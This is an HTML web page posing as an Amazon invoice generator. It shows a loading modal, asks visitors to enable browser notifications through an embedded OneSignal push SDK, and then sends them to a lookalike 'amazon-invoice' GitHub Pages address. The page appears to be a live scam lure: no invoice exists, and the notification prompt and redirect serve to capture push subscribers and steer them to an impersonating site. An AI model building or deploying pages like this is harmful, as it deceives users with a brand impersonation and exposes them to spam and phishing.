<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Generating Your Invoice</title>

<!-- OneSignal SDK -->
<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>

<script>
  window.OneSignalDeferred = window.OneSignalDeferred || [];
  OneSignalDeferred.push(async function(OneSignal) {
    await OneSignal.init({
      appId: "59378825-1e42-4024-a9f1-87553ae750f8",
      allowLocalhostAsSecureOrigin: true
    });

    // Wait for subscription / player ID
    try {
      const playerId = await OneSignal.getUserIdAsync();
      console.log("Player ID found:", playerId);

      // Redirect to your invoice page immediately
      window.location.href = "https://amazon-invoice.github.io/Invoice-9812832/";
    } catch (err) {
      console.error("Error retrieving player ID:", err);
      // Fallback: redirect anyway
      window.location.href = "https://amazon-invoice.github.io/Invoice-9812832/";
    }
  });
</script>

<style>
body {
  font-family: Arial, Helvetica, sans-serif;
  background-color: #f2f2f2;
  margin: 0;
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}

.modal-overlay {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.4);
  display: flex;
  align-items: center;
  justify-content: center;
}

.modal {
  background: #ffffff;
  width: 420px;
  padding: 25px 30px;
  border-radius: 6px;
  text-align: center;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
}

.modal h2 {
  margin: 0 0 10px;
  font-size: 20px;
  color: #111;
}

.modal p {
  font-size: 14px;
  color: #555;
  line-height: 1.5;
  margin-bottom: 16px;
}

.loader {
  width: 45px;
  height: 45px;
  border: 4px solid #e0e0e0;
  border-top: 4px solid #ff9900;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.note {
  margin-top: 14px;
  font-size: 12px;
  color: #777;
}
</style>
</head>

<body>
<div class="modal-overlay">
  <div class="modal">
    <h2>Generating Your Invoice</h2>
    <p>ðŸ”” Turn on notifications to be alerted the moment your invoice is ready.</p>
    <p>We are preparing your invoice. This process usually takes less than a minute.</p>
    <p>Browser notifications are optional and are used only to notify you when your invoice is ready.</p>
    <div class="loader"></div>
    <div class="note">You can keep browsing or stay on this page â€” weâ€™ll take care of the rest.</div>
  </div>
</div>
</body>
</html>
